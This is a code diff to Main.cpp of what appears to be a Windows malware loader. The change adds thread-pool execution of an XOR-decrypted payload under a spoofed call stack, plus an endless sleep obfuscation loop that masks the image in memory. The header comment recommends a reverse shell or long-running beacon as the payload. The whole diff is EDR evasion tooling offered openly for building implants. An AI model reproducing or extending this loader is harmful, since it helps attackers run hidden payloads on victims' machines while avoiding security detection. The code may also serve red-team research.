@@ -1,6 +1,6 @@
 /* Main.cpp
  *
- * NOTE: For testing call stack spoofing, use a persistent
+ * NOTE: For testing call stack spoofing and sleep obfuscation, use a persistent
  * payload that does not exit immediately (e.g. a reverse shell or a long-running
  * beacon). Short-lived payloads like exec/calc will terminate before you can
  * inspect the spoofed call stack.
@@ -56,10 +56,23 @@ VOID XorDecrypt(PBYTE pPayload, SIZE_T sPayloadSize, PBYTE pKey, SIZE_T sKeySize
     }
 }
 
+struct PAYLOAD_ARGS {
+    PBYTE   pBuffer;
+    DWORD   dwSize;
+};
+
+VOID NTAPI PayloadWorker(PVOID Context) {
+    PAYLOAD_ARGS* pArgs = (PAYLOAD_ARGS*)Context;
+    StackSpoof::ExecuteWithSpoofedStack(pArgs->pBuffer, pArgs->dwSize);
+}
+
+VOID ZileanSleep(DWORD dwTimeout);
+
 int main() {
 
     PBYTE                                      Data                 = (PBYTE)CipherText;
     SIZE_T                                     Size                 = sizeof(CipherText);
+    DWORD                                      Timeout              = 6 * 1000;
 
 #ifdef DEBUG
     CreateDebugConsole();
@@ -88,11 +101,25 @@ int main() {
     DBGPRINT("[+] Success \n");
 #endif
 
-    /* Execute payload with stack spoofing */
-    StackSpoof::ExecuteWithSpoofedStack(
-        Data,
-        Size
-    );
+    /* Create event for payload readiness signaling */
+    g_Win32.Nt.NtCreateEvent(&g_PayloadReady, EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE);
+
+    /* Queue payload on worker thread — runs ExecuteWithSpoofedStack */
+    PAYLOAD_ARGS Args = { Data, (DWORD)Size };
+    g_Win32.Nt.RtlQueueWorkItem((WORKERCALLBACKFUNC)PayloadWorker, &Args, WT_EXECUTEDEFAULT);
+
+    /* Wait until payload signals it's ready (right before ShadowGate call) */
+    g_Win32.Nt.NtWaitForSingleObject(g_PayloadReady, FALSE, nullptr);
+    Macro::DeleteHandle(g_PayloadReady);
+
+#ifdef DEBUG
+    DBGPRINT("\n[+] Payload Started, Beginning Sleep Obfuscation \n");
+#endif
+
+    /* Sleep obfuscation loop */
+    while (TRUE) {
+        MaskImage(Timeout);
+    }
 
     return 0;
 }
